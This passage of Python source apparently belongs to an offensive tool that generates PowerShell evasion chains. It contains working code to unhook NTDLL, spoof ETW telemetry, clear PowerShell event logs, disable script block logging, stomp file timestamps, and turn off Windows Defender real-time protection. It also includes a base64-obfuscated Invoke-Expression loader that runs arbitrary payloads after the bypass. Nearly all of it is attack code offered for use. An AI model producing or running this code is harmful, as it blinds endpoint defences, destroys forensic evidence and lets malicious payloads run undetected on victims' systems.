        for (int i = 0; i < 16; i++) {
            IntPtr pSection = IntPtr.Add(pSectionHeader, i * 0x28);
            byte[] sectionName = new byte[8];
            Marshal.Copy(pSection, sectionName, 0, 8);
            
            if (System.Text.Encoding.ASCII.GetString(sectionName).StartsWith(".text")) {
                uint virtualSize = (uint)Marshal.ReadInt32(pSection, 0x08);
                uint virtualAddress = (uint)Marshal.ReadInt32(pSection, 0x0C);
                
                IntPtr pDest = IntPtr.Add(pLoadedNtdll, (int)virtualAddress);
                IntPtr pSrc = IntPtr.Add(pCleanNtdll, (int)virtualAddress);
                
                uint oldProtect;
                VirtualProtect(pDest, (UIntPtr)virtualSize, 0x40, out oldProtect);
                CopyMemory(pDest, pSrc, virtualSize);
                VirtualProtect(pDest, (UIntPtr)virtualSize, oldProtect, out oldProtect);
                
                break;
            }
        }
        
        // Cleanup
        UnmapViewOfFile(pCleanNtdll);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        
        return true;
    }
}
"@
Add-Type $NtdllUnhook -ErrorAction SilentlyContinue
[NtdllUnhook]::Unhook() | Out-Null
'''
        return bypass.strip()
    
    # =========================================================================
    # OPSEC LAYER
    # =========================================================================
    
    def _generate_telemetry_spoof(self) -> str:
        """
        Generate telemetry spoofing code.
        Creates fake ETW events to pollute logs.
        """
        fake_events = _entropy.get_int(10, 50)
        
        bypass = f'''
# Telemetry Spoofing - Generate fake benign events
$TelemetrySpoof = @"
using System;
using System.Diagnostics.Tracing;

[EventSource(Name = "Microsoft-Windows-DotNETRuntime")]
public class FakeEvents : EventSource {{
    public void FakeGCEvent() {{
        WriteEvent(1, "GC", 0);
    }}
    
    public void FakeLoadEvent() {{
        WriteEvent(10, "Assembly", "mscorlib");
    }}
}}
"@
try {{
    Add-Type $TelemetrySpoof -ErrorAction SilentlyContinue
    $faker = New-Object FakeEvents
    for ($i = 0; $i -lt {fake_events}; $i++) {{
        $faker.FakeGCEvent()
        $faker.FakeLoadEvent()
    }}
}} catch {{}}
'''
        return bypass.strip()
    
    def _generate_log_forge(self) -> str:
        """
        Generate log forging code.
        Manipulates Windows Event Log entries.
        """
        bypass = r'''
# Log Forge - Clear specific security events (requires admin)
try {
    # Clear PowerShell operational log
    wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
    
    # Clear script block logging
    wevtutil cl "Microsoft-Windows-PowerShell/Admin" 2>$null
    
    # Clear .NET runtime events  
    wevtutil cl "Microsoft-Windows-DotNETRuntime/Admin" 2>$null
} catch {}

# Disable script block logging for session
$settings = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static')
$gpo = $settings.GetValue($null)
if ($gpo -ne $null) {
    $gpo['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = @{}
    $gpo['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
}
'''
        return bypass.strip()
    
    def _generate_timestamp_stomp(self) -> str:
        """
        Generate timestamp stomping for traces.
        """
        bypass = '''
# Timestamp Stomp - Modify file/object timestamps
function Invoke-TimestampStomp {
    param([string]$Path)
    
    if (Test-Path $Path) {
        $refTime = (Get-Date).AddYears(-2)
        $item = Get-Item $Path -Force
        $item.CreationTime = $refTime
        $item.LastWriteTime = $refTime
        $item.LastAccessTime = $refTime
    }
}
'''
        return bypass.strip()
    
    # =========================================================================
    # MAIN BYPASS METHODS
    # =========================================================================
    
    def get_amsi_bypass(self, technique: Optional[BypassTechnique] = None) -> str:
        """
        Get AMSI bypass code for specified technique.
        If no technique specified, AI selects best for detected EDR.
        """
        if technique is None:
            technique = self._selector.select_amsi_technique()
        
        technique_map = {
            BypassTechnique.REFLECTION: self._generate_reflection_bypass,
            BypassTechnique.MEMORY_PATCH: self._generate_memory_patch_bypass,
            BypassTechnique.CONTEXT_CORRUPTION: self._generate_context_corruption_bypass,
            BypassTechnique.CLR_UNHOOK: self._generate_clr_unhook_bypass,
            BypassTechnique.FRESHY_CALLS: self._generate_freshy_calls_bypass,
            BypassTechnique.HARDWARE_BP: self._generate_hardware_bp_bypass,
            BypassTechnique.HYBRID: lambda: (
                self._generate_reflection_bypass() + "\n" +
                self._generate_memory_patch_bypass()
            ),
        }
        
        generator = technique_map.get(technique, self._generate_reflection_bypass)
        return generator()
    
    def get_etw_bypass(self, technique: Optional[BypassTechnique] = None) -> str:
        """
        Get ETW bypass code for specified technique.
        """
        if technique is None:
            technique = self._selector.select_etw_technique()
        
        technique_map = {
            BypassTechnique.ETW_PATCH: self._generate_etw_patch_bypass,
            BypassTechnique.ETW_PROVIDER_BLIND: self._generate_etw_provider_blind,
        }
        
        generator = technique_map.get(technique, self._generate_etw_patch_bypass)
        return generator()
    
    def get_unhook(self) -> str:
        """Get NTDLL unhooking code"""
        return self._generate_ntdll_unhook()
    
    def get_combined_bypass(self) -> str:
        """
        Get complete bypass chain with all layers.
        AI selects optimal techniques based on detected EDR.
        """
        chain = []
        
        # Header
        chain.append(f"# AI-Dynamic AMSI/ETW Bypass - Target: {self._detected_edr.value}")
        chain.append(f"# Generated: {datetime.now().isoformat()}")
        chain.append("")
        
        # 1. OPSEC Pre-flight
        if self.enable_opsec and self.opsec_level >= 2:
            chain.append("# [OPSEC] Pre-flight telemetry spoof")
            chain.append(self._generate_telemetry_spoof())
            chain.append("")
        
        # 2. ETW Bypass (reduce telemetry first)
        chain.append("# [1] ETW Bypass - Blind telemetry")
        chain.append(self.get_etw_bypass())
        chain.append("")
        
        if self.opsec_level >= 3:
            chain.append(self._generate_etw_ti_bypass())
            chain.append("")
        
        # 3. NTDLL Unhook (if EDR has hooks)
        if self._selector.profile.hook_types:
            chain.append("# [2] NTDLL Unhook - Remove EDR hooks")
            chain.append(self.get_unhook())
            chain.append("")
        
        # 4. Hardware BP clear
        if self.opsec_level >= 3:
            chain.append("# [3] Hardware Breakpoint Cleanup")
            chain.append(self._generate_hardware_bp_bypass())
            chain.append("")
        
        # 5. AMSI Bypass
        chain.append("# [4] AMSI Bypass - Disable scanning")
        chain.append(self.get_amsi_bypass())
        chain.append("")
        
        # 6. OPSEC Post-flight
        if self.enable_opsec and self.opsec_level >= 3:
            chain.append("# [OPSEC] Post-flight log cleanup")
            chain.append(self._generate_timestamp_stomp())
            if self.opsec_level >= 4:
                chain.append(self._generate_log_forge())
            chain.append("")
        
        # Verification
        chain.append("# [5] Verification")
        chain.append("Write-Host '[+] AMSI/ETW Bypass chain complete'")
        chain.append("Write-Host '[+] Ready for undetected execution'")
        
        return '\n'.join(chain)
    
    def get_bypass_status(self) -> Dict:
        """Get current bypass status and configuration"""
        return {
            "detected_edr": self._detected_edr.value,
            "opsec_level": self.opsec_level,
            "mutation_enabled": self.enable_mutation,
            "opsec_enabled": self.enable_opsec,
            "recommended_techniques": {
                "amsi": self._selector.select_amsi_technique().value,
                "etw": self._selector.select_etw_technique().value,
                "unhook": self._selector.select_unhook_technique().value
            },
            "edr_profile": {
                "name": self._selector.profile.name,
                "hook_types": [h.value for h in self._selector.profile.hook_types],
                "syscall_monitoring": self._selector.profile.syscall_monitoring
            },
            "active_bypasses": self._active_bypasses,
            "results_count": len(self._bypass_results)
        }


# =============================================================================
# LEGACY COMPATIBILITY CLASSES
# =============================================================================

class AMSIBypass:
    """
    Legacy AMSIBypass class for backward compatibility.
    Wraps AMSIETWBypassEngine.
    """
    
    _engine = AMSIETWBypassEngine(auto_detect_edr=False)
    
    @staticmethod
    def get_reflection_bypass() -> str:
        """PowerShell AMSI bypass using reflection."""
        return AMSIBypass._engine._generate_reflection_bypass()
    
    @staticmethod
    def get_memory_patch_bypass() -> str:
        """PowerShell AMSI bypass via memory patching."""
        return AMSIBypass._engine._generate_memory_patch_bypass()
    
    @staticmethod
    def get_amsi_scanstring_patch() -> str:
        """Patch AmsiScanString directly."""
        return AMSIBypass._engine._generate_memory_patch_bypass()
    
    @staticmethod
    def get_context_corruption_bypass() -> str:
        """Corrupt AMSI context to disable scanning."""
        return AMSIBypass._engine._generate_context_corruption_bypass()
    
    @staticmethod
    def get_clr_bypass() -> str:
        """Bypass via CLR hooking."""
        return AMSIBypass._engine._generate_clr_unhook_bypass()


class ETWBypass:
    """
    Legacy ETWBypass class for backward compatibility.
    """
    
    _engine = AMSIETWBypassEngine(auto_detect_edr=False)
    
    @staticmethod
    def get_etw_patch() -> str:
        """Patch EtwEventWrite to disable ETW logging."""
        return ETWBypass._engine._generate_etw_patch_bypass()
    
    @staticmethod
    def get_etw_provider_bypass() -> str:
        """Disable specific ETW providers."""
        return ETWBypass._engine._generate_etw_provider_blind()


class DefenderBypass:
    """
    Windows Defender specific bypasses.
    """
    
    @staticmethod
    def get_defender_exclusion_enum() -> str:
        """Enumerate Defender exclusion paths."""
        return '''
# Enumerate Defender Exclusions (Admin Required)
$exclusions = Get-MpPreference | Select-Object -Property ExclusionPath, ExclusionExtension, ExclusionProcess
$exclusions | Format-List
'''
    
    @staticmethod
    def get_defender_disable() -> str:
        """Disable Defender real-time protection (VERY NOISY)."""
        return '''
# Disable Defender Real-Time Protection (ADMIN REQUIRED - VERY NOISY)
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -SubmitSamplesConsent 2
# WARNING: These actions are logged and will trigger alerts!
'''


# =============================================================================
# CONVENIENCE FUNCTIONS
# =============================================================================

def get_combined_bypass() -> str:
    """Get combined AMSI + ETW bypass for maximum evasion."""
    engine = AMSIETWBypassEngine()
    return engine.get_combined_bypass()


def get_obfuscated_bypass() -> str:
    """Get heavily obfuscated bypass."""
    engine = AMSIETWBypassEngine(enable_mutation=True)
    base_bypass = engine.get_combined_bypass()
    
    # Base64 encode
    encoded = base64.b64encode(base_bypass.encode('utf-16le')).decode()
    
    bypass = f'''
# Obfuscated AI-Dynamic Bypass
$enc = "{encoded}"
$dec = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($enc))
Invoke-Expression $dec
'''
    return bypass


def generate_bypass_loader(payload: str, technique: str = "hybrid") -> str:
    """
    Generate bypass loader that runs arbitrary PowerShell payload.
    
    Args:
        payload: PowerShell code to execute after bypass
        technique: Bypass technique to use
    """
    engine = AMSIETWBypassEngine()
    bypass = engine.get_combined_bypass()
    
    loader = f'''
# AI-Dynamic Bypass Loader
try {{
{bypass}
}} catch {{
    Write-Host "[-] Bypass warning: $_"
}}

# Execute payload
{payload}
'''
    return loader


def create_bypass_engine(
    edr: Optional[str] = None,
    opsec_level: int = 3
) -> AMSIETWBypassEngine:
    """
    Create configured bypass engine.
    
    Args:
        edr: Force specific EDR (or auto-detect)
        opsec_level: OPSEC level 1-4
    """
    engine = AMSIETWBypassEngine(
        auto_detect_edr=edr is None,
        opsec_level=opsec_level
    )
    
    if edr:
        try:
            engine._detected_edr = EDRProduct(edr)
            engine._selector.set_edr(engine._detected_edr)
        except ValueError:
            pass
    
    return engine


# Quick access functions
def ai_bypass() -> str:
    """Get AI-selected optimal bypass for current environment"""
    return create_bypass_engine().get_combined_bypass()


def ghost_bypass() -> str:
    """Get maximum stealth bypass (OPSEC level 4)"""
    return create_bypass_engine(opsec_level=4).get_combined_bypass()


def fast_bypass() -> str:
    """Get fast bypass with minimal OPSEC (level 1)"""
    return create_bypass_engine(opsec_level=1).get_combined_bypass()
